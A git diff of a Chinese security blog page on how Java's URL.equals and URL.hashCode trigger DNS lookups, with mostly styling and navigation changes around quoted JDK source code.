@@ -3,7 +3,7 @@
   <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="generator" content="Hugo 0.124.1">
+    <meta name="generator" content="Hugo 0.119.0">
     <meta name="description" content="记录一些学习和生活日常">
 <meta name="author" content="darkmoon">
 
@@ -12,23 +12,23 @@
     <title>JAVA URL DNS 研究 - chestnut&#39;s blog</title>
 
     
-    <link href="/css/nucleus.css?1712424309" rel="stylesheet">
-    <link href="/css/fontawesome-all.min.css?1712424309" rel="stylesheet">
-    <link href="/css/hybrid.css?1712424309" rel="stylesheet">
-    <link href="/css/featherlight.min.css?1712424309" rel="stylesheet">
-    <link href="/css/perfect-scrollbar.min.css?1712424309" rel="stylesheet">
-    <link href="/css/auto-complete.css?1712424309" rel="stylesheet">
-    <link href="/css/atom-one-dark-reasonable.css?1712424309" rel="stylesheet">
-    <link href="/css/theme.css?1712424309" rel="stylesheet">
-    <link href="/css/tabs.css?1712424309" rel="stylesheet">
-    <link href="/css/hugo-theme.css?1712424309" rel="stylesheet">
+    <link href="/css/nucleus.css?1713376033" rel="stylesheet">
+    <link href="/css/fontawesome-all.min.css?1713376033" rel="stylesheet">
+    <link href="/css/hybrid.css?1713376033" rel="stylesheet">
+    <link href="/css/featherlight.min.css?1713376033" rel="stylesheet">
+    <link href="/css/perfect-scrollbar.min.css?1713376033" rel="stylesheet">
+    <link href="/css/auto-complete.css?1713376033" rel="stylesheet">
+    <link href="/css/atom-one-dark-reasonable.css?1713376033" rel="stylesheet">
+    <link href="/css/theme.css?1713376033" rel="stylesheet">
+    <link href="/css/tabs.css?1713376033" rel="stylesheet">
+    <link href="/css/hugo-theme.css?1713376033" rel="stylesheet">
     
-    <link href="/css/theme-blue.css?1712424309" rel="stylesheet">
+    <link href="/css/theme-blue.css?1713376033" rel="stylesheet">
     
     
-    <script src="/js/dayjs.min.js?1712424309"></script>
+    <script src="/js/dayjs.min.js?1713376033"></script>
 
-    <script src="/js/jquery-3.3.1.min.js?1712424309"></script>
+    <script src="/js/jquery-3.3.1.min.js?1713376033"></script>
     
     
     
@@ -109,14 +109,14 @@
     <span data-search-clear=""><i class="fas fa-times"></i></span>
 </div>
 
-<script type="text/javascript" src="/js/lunr.min.js?1712424309"></script>
-<script type="text/javascript" src="/js/auto-complete.js?1712424309"></script>
+<script type="text/javascript" src="/js/lunr.min.js?1713376033"></script>
+<script type="text/javascript" src="/js/auto-complete.js?1713376033"></script>
 <script type="text/javascript">
     
-        var baseurl = "https:\/\/www.ch35tnut.com\/\/zh-cn";
+        var baseurl = "https:\/\/www.ch35tnut.com\/zh-cn";
     
 </script>
-<script type="text/javascript" src="/js/search.js?1712424309"></script>
+<script type="text/javascript" src="/js/search.js?1713376033"></script>
 
     
   </div>
@@ -854,6 +854,65 @@
  
   
     
+    <li data-nav-id="/zh-cn/vulnerability/cve-2024-3094-what-can-we-learn-from-xz-backdoor/" title="CVE 2024 3094 What Can We Learn From Xz Backdoor" class="dd-item
+        
+        
+        
+        ">
+      <a href="/zh-cn/vulnerability/cve-2024-3094-what-can-we-learn-from-xz-backdoor/">
+          <b>X. </b>CVE 2024 3094 What Can We Learn From Xz Backdoor
+          
+            <i class="fas fa-check read-icon"></i>
+          
+      </a>
+      
+      
+        <ul>
+          
+          
+          
+
+        
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/zh-cn/vulnerability/cve-2024-3094-what-can-we-learn-from-xz-backdoor/part-1-script/" title="Part 1 Script" class="dd-item ">
+        <a href="/zh-cn/vulnerability/cve-2024-3094-what-can-we-learn-from-xz-backdoor/part-1-script/">
+        Part 1 Script
+        <i class="fas fa-check read-icon"></i>
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+        
+        </ul>
+      
+    </li>
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
     <li data-nav-id="/zh-cn/vulnerability/windows-clfs-eop/" title="Windows CLFS EoP" class="dd-item
         
         
@@ -920,27 +979,6 @@
         </ul>
       
     </li>
-  
- 
-
-            
-          
-            
-            
-
-
-
-
- 
-  
-    
-      <li data-nav-id="/zh-cn/vulnerability/cve-2024-3094-what-can-we-learn-from-xz-backdoor/" title="CVE-2024-3094 What Can We Learn From Xz Backdoor" class="dd-item ">
-        <a href="/zh-cn/vulnerability/cve-2024-3094-what-can-we-learn-from-xz-backdoor/">
-        CVE-2024-3094 What Can We Learn From Xz Backdoor
-        <i class="fas fa-check read-icon"></i>
-        </a>
-    </li>
-     
   
  
 
@@ -2468,170 +2506,170 @@
 <a href="mailto:whipper.0p@icloud.com">whipper.0p@icloud.com</a></p>
 <h4 id="url类dns请求">URL类DNS请求</h4>
 <p>使用URL.equals会发起DNS请求</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">urltest</span> {
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(String<span style="color:#f92672">[]</span> args) <span style="color:#66d9ef">throws</span> MalformedURLException {
-</span></span><span style="display:flex;"><span>        System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>(<span style="color:#e6db74">&#34;hello &#34;</span>);
-</span></span><span style="display:flex;"><span>        URL u <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> URL(<span style="color:#e6db74">&#34;http://www.baidu.com&#34;</span>);
-</span></span><span style="display:flex;"><span>        URL u1 <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> URL(<span style="color:#e6db74">&#34;http://www.baidu.com&#34;</span>);
-</span></span><span style="display:flex;"><span>       System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>(u.<span style="color:#a6e22e">equals</span>(u1));
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>}
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">urltest</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span><span style="color:#f92672">(</span>String<span style="color:#f92672">[]</span> args<span style="color:#f92672">)</span> <span style="color:#66d9ef">throws</span> MalformedURLException <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>        System<span style="color:#f92672">.</span><span style="color:#a6e22e">out</span><span style="color:#f92672">.</span><span style="color:#a6e22e">println</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;hello &#34;</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>        URL u <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> URL<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;http://www.baidu.com&#34;</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>        URL u1 <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> URL<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;http://www.baidu.com&#34;</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>       System<span style="color:#f92672">.</span><span style="color:#a6e22e">out</span><span style="color:#f92672">.</span><span style="color:#a6e22e">println</span><span style="color:#f92672">(</span>u<span style="color:#f92672">.</span><span style="color:#a6e22e">equals</span><span style="color:#f92672">(</span>u1<span style="color:#f92672">));</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
 </span></span></code></pre></div><p>
 <img alt="" src="/images/research/web/java-deserialization/urldns.zh-cn.assets/2.png" /></p>
 <p>跟进代码，equals代码如下，</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>    <span style="color:#66d9ef">protected</span> <span style="color:#66d9ef">boolean</span> <span style="color:#a6e22e">equals</span>(URL u1, URL u2) {
-</span></span><span style="display:flex;"><span>        String ref1 <span style="color:#f92672">=</span> u1.<span style="color:#a6e22e">getRef</span>();
-</span></span><span style="display:flex;"><span>        String ref2 <span style="color:#f92672">=</span> u2.<span style="color:#a6e22e">getRef</span>();
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> (ref1 <span style="color:#f92672">==</span> ref2 <span style="color:#f92672">||</span> (ref1 <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span> <span style="color:#f92672">&amp;&amp;</span> ref1.<span style="color:#a6e22e">equals</span>(ref2))) <span style="color:#f92672">&amp;&amp;</span>
-</span></span><span style="display:flex;"><span>               sameFile(u1, u2);
-</span></span><span style="display:flex;"><span>    }
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>    <span style="color:#66d9ef">protected</span> <span style="color:#66d9ef">boolean</span> <span style="color:#a6e22e">equals</span><span style="color:#f92672">(</span>URL u1<span style="color:#f92672">,</span> URL u2<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>        String ref1 <span style="color:#f92672">=</span> u1<span style="color:#f92672">.</span><span style="color:#a6e22e">getRef</span><span style="color:#f92672">();</span>
+</span></span><span style="display:flex;"><span>        String ref2 <span style="color:#f92672">=</span> u2<span style="color:#f92672">.</span><span style="color:#a6e22e">getRef</span><span style="color:#f92672">();</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">(</span>ref1 <span style="color:#f92672">==</span> ref2 <span style="color:#f92672">||</span> <span style="color:#f92672">(</span>ref1 <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span> <span style="color:#f92672">&amp;&amp;</span> ref1<span style="color:#f92672">.</span><span style="color:#a6e22e">equals</span><span style="color:#f92672">(</span>ref2<span style="color:#f92672">)))</span> <span style="color:#f92672">&amp;&amp;</span>
+</span></span><span style="display:flex;"><span>               sameFile<span style="color:#f92672">(</span>u1<span style="color:#f92672">,</span> u2<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
 </span></span></code></pre></div><p>判断reference是否相同，而后使用sameFile函数，sameFile函数会查看其协议、uri、端口、主机是否相等。</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>    <span style="color:#66d9ef">protected</span> <span style="color:#66d9ef">boolean</span> <span style="color:#a6e22e">sameFile</span>(URL u1, URL u2) {
-</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Compare the protocols.</span>
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>((u1.<span style="color:#a6e22e">getProtocol</span>() <span style="color:#f92672">==</span> u2.<span style="color:#a6e22e">getProtocol</span>()) <span style="color:#f92672">||</span>
-</span></span><span style="display:flex;"><span>              (u1.<span style="color:#a6e22e">getProtocol</span>() <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span> <span style="color:#f92672">&amp;&amp;</span>
-</span></span><span style="display:flex;"><span>               u1.<span style="color:#a6e22e">getProtocol</span>().<span style="color:#a6e22e">equalsIgnoreCase</span>(u2.<span style="color:#a6e22e">getProtocol</span>()))))
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>    <span style="color:#66d9ef">protected</span> <span style="color:#66d9ef">boolean</span> <span style="color:#a6e22e">sameFile</span><span style="color:#f92672">(</span>URL u1<span style="color:#f92672">,</span> URL u2<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Compare the protocols.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">(!((</span>u1<span style="color:#f92672">.</span><span style="color:#a6e22e">getProtocol</span><span style="color:#f92672">()</span> <span style="color:#f92672">==</span> u2<span style="color:#f92672">.</span><span style="color:#a6e22e">getProtocol</span><span style="color:#f92672">())</span> <span style="color:#f92672">||</span>
+</span></span><span style="display:flex;"><span>              <span style="color:#f92672">(</span>u1<span style="color:#f92672">.</span><span style="color:#a6e22e">getProtocol</span><span style="color:#f92672">()</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span> <span style="color:#f92672">&amp;&amp;</span>
+</span></span><span style="display:flex;"><span>               u1<span style="color:#f92672">.</span><span style="color:#a6e22e">getProtocol</span><span style="color:#f92672">().</span><span style="color:#a6e22e">equalsIgnoreCase</span><span style="color:#f92672">(</span>u2<span style="color:#f92672">.</span><span style="color:#a6e22e">getProtocol</span><span style="color:#f92672">()))))</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span><span style="color:#f92672">;</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Compare the files.</span>
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>(u1.<span style="color:#a6e22e">getFile</span>() <span style="color:#f92672">==</span> u2.<span style="color:#a6e22e">getFile</span>() <span style="color:#f92672">||</span>
-</span></span><span style="display:flex;"><span>              (u1.<span style="color:#a6e22e">getFile</span>() <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span> <span style="color:#f92672">&amp;&amp;</span> u1.<span style="color:#a6e22e">getFile</span>().<span style="color:#a6e22e">equals</span>(u2.<span style="color:#a6e22e">getFile</span>()))))
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Compare the files.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">(!(</span>u1<span style="color:#f92672">.</span><span style="color:#a6e22e">getFile</span><span style="color:#f92672">()</span> <span style="color:#f92672">==</span> u2<span style="color:#f92672">.</span><span style="color:#a6e22e">getFile</span><span style="color:#f92672">()</span> <span style="color:#f92672">||</span>
+</span></span><span style="display:flex;"><span>              <span style="color:#f92672">(</span>u1<span style="color:#f92672">.</span><span style="color:#a6e22e">getFile</span><span style="color:#f92672">()</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span> <span style="color:#f92672">&amp;&amp;</span> u1<span style="color:#f92672">.</span><span style="color:#a6e22e">getFile</span><span style="color:#f92672">().</span><span style="color:#a6e22e">equals</span><span style="color:#f92672">(</span>u2<span style="color:#f92672">.</span><span style="color:#a6e22e">getFile</span><span style="color:#f92672">()))))</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span><span style="color:#f92672">;</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Compare the ports.</span>
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">int</span> port1, port2;
-</span></span><span style="display:flex;"><span>        port1 <span style="color:#f92672">=</span> (u1.<span style="color:#a6e22e">getPort</span>() <span style="color:#f92672">!=</span> <span style="color:#f92672">-</span>1) <span style="color:#f92672">?</span> u1.<span style="color:#a6e22e">getPort</span>() : u1.<span style="color:#a6e22e">handler</span>.<span style="color:#a6e22e">getDefaultPort</span>();
-</span></span><span style="display:flex;"><span>        port2 <span style="color:#f92672">=</span> (u2.<span style="color:#a6e22e">getPort</span>() <span style="color:#f92672">!=</span> <span style="color:#f92672">-</span>1) <span style="color:#f92672">?</span> u2.<span style="color:#a6e22e">getPort</span>() : u2.<span style="color:#a6e22e">handler</span>.<span style="color:#a6e22e">getDefaultPort</span>();
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (port1 <span style="color:#f92672">!=</span> port2)
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Compare the ports.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">int</span> port1<span style="color:#f92672">,</span> port2<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>        port1 <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>u1<span style="color:#f92672">.</span><span style="color:#a6e22e">getPort</span><span style="color:#f92672">()</span> <span style="color:#f92672">!=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span><span style="color:#f92672">)</span> <span style="color:#f92672">?</span> u1<span style="color:#f92672">.</span><span style="color:#a6e22e">getPort</span><span style="color:#f92672">()</span> <span style="color:#f92672">:</span> u1<span style="color:#f92672">.</span><span style="color:#a6e22e">handler</span><span style="color:#f92672">.</span><span style="color:#a6e22e">getDefaultPort</span><span style="color:#f92672">();</span>
+</span></span><span style="display:flex;"><span>        port2 <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>u2<span style="color:#f92672">.</span><span style="color:#a6e22e">getPort</span><span style="color:#f92672">()</span> <span style="color:#f92672">!=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span><span style="color:#f92672">)</span> <span style="color:#f92672">?</span> u2<span style="color:#f92672">.</span><span style="color:#a6e22e">getPort</span><span style="color:#f92672">()</span> <span style="color:#f92672">:</span> u2<span style="color:#f92672">.</span><span style="color:#a6e22e">handler</span><span style="color:#f92672">.</span><span style="color:#a6e22e">getDefaultPort</span><span style="color:#f92672">();</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>port1 <span style="color:#f92672">!=</span> port2<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span><span style="color:#f92672">;</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Compare the hosts.</span>
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>hostsEqual(u1, u2))
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Compare the hosts.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">(!</span>hostsEqual<span style="color:#f92672">(</span>u1<span style="color:#f92672">,</span> u2<span style="color:#f92672">))</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span><span style="color:#f92672">;</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>;
-</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span><span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
 </span></span></code></pre></div><p>hostsEqual方法中会调用getHostAddress方法，getHostAddress方法会通过InetAddress.getByName函数获取到域名对应的IP地址，触发DNS解析</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>    <span style="color:#66d9ef">protected</span> <span style="color:#66d9ef">boolean</span> <span style="color:#a6e22e">hostsEqual</span>(URL u1, URL u2) {
-</span></span><span style="display:flex;"><span>        InetAddress a1 <span style="color:#f92672">=</span> getHostAddress(u1);
-</span></span><span style="display:flex;"><span>        InetAddress a2 <span style="color:#f92672">=</span> getHostAddress(u2);
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>    <span style="color:#66d9ef">protected</span> <span style="color:#66d9ef">boolean</span> <span style="color:#a6e22e">hostsEqual</span><span style="color:#f92672">(</span>URL u1<span style="color:#f92672">,</span> URL u2<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>        InetAddress a1 <span style="color:#f92672">=</span> getHostAddress<span style="color:#f92672">(</span>u1<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>        InetAddress a2 <span style="color:#f92672">=</span> getHostAddress<span style="color:#f92672">(</span>u2<span style="color:#f92672">);</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">protected</span> <span style="color:#66d9ef">synchronized</span> InetAddress <span style="color:#a6e22e">getHostAddress</span>(URL u) {
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (u.<span style="color:#a6e22e">hostAddress</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span>)
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> u.<span style="color:#a6e22e">hostAddress</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">protected</span> <span style="color:#66d9ef">synchronized</span> InetAddress <span style="color:#a6e22e">getHostAddress</span><span style="color:#f92672">(</span>URL u<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>u<span style="color:#f92672">.</span><span style="color:#a6e22e">hostAddress</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> u<span style="color:#f92672">.</span><span style="color:#a6e22e">hostAddress</span><span style="color:#f92672">;</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        String host <span style="color:#f92672">=</span> u.<span style="color:#a6e22e">getHost</span>();
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (host <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span> <span style="color:#f92672">||</span> host.<span style="color:#a6e22e">isEmpty</span>()) {
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">null</span>;
-</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> {
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">try</span> {
-</span></span><span style="display:flex;"><span>                u.<span style="color:#a6e22e">hostAddress</span> <span style="color:#f92672">=</span> InetAddress.<span style="color:#a6e22e">getByName</span>(host);
-</span></span><span style="display:flex;"><span>            } <span style="color:#66d9ef">catch</span> (UnknownHostException ex) {
-</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">null</span>;
-</span></span><span style="display:flex;"><span>            } <span style="color:#66d9ef">catch</span> (SecurityException se) {
-</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">null</span>;
-</span></span><span style="display:flex;"><span>            }
-</span></span><span style="display:flex;"><span>        }
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> u.<span style="color:#a6e22e">hostAddress</span>;
-</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>        String host <span style="color:#f92672">=</span> u<span style="color:#f92672">.</span><span style="color:#a6e22e">getHost</span><span style="color:#f92672">();</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>host <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span> <span style="color:#f92672">||</span> host<span style="color:#f92672">.</span><span style="color:#a6e22e">isEmpty</span><span style="color:#f92672">())</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span> <span style="color:#66d9ef">else</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">try</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>                u<span style="color:#f92672">.</span><span style="color:#a6e22e">hostAddress</span> <span style="color:#f92672">=</span> InetAddress<span style="color:#f92672">.</span><span style="color:#a6e22e">getByName</span><span style="color:#f92672">(</span>host<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">}</span> <span style="color:#66d9ef">catch</span> <span style="color:#f92672">(</span>UnknownHostException ex<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">}</span> <span style="color:#66d9ef">catch</span> <span style="color:#f92672">(</span>SecurityException se<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> u<span style="color:#f92672">.</span><span style="color:#a6e22e">hostAddress</span><span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
 </span></span></code></pre></div><p>同样的URL类中的hashCode也会触发DNS请求，通过getHostAddress获取到IP地址，需要注意的是其中hashCode会被缓存</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">synchronized</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">hashCode</span>() {
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (hashCode <span style="color:#f92672">!=</span> <span style="color:#f92672">-</span>1)
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> hashCode;
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">synchronized</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">hashCode</span><span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>hashCode <span style="color:#f92672">!=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> hashCode<span style="color:#f92672">;</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        hashCode <span style="color:#f92672">=</span> handler.<span style="color:#a6e22e">hashCode</span>(<span style="color:#66d9ef">this</span>);
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> hashCode;
-</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>        hashCode <span style="color:#f92672">=</span> handler<span style="color:#f92672">.</span><span style="color:#a6e22e">hashCode</span><span style="color:#f92672">(</span><span style="color:#66d9ef">this</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> hashCode<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">protected</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">hashCode</span>(URL u) {
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">int</span> h <span style="color:#f92672">=</span> 0;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">protected</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">hashCode</span><span style="color:#f92672">(</span>URL u<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">int</span> h <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span><span style="color:#f92672">;</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Generate the protocol part.</span>
-</span></span><span style="display:flex;"><span>        String protocol <span style="color:#f92672">=</span> u.<span style="color:#a6e22e">getProtocol</span>();
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (protocol <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span>)
-</span></span><span style="display:flex;"><span>            h <span style="color:#f92672">+=</span> protocol.<span style="color:#a6e22e">hashCode</span>();
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Generate the protocol part.
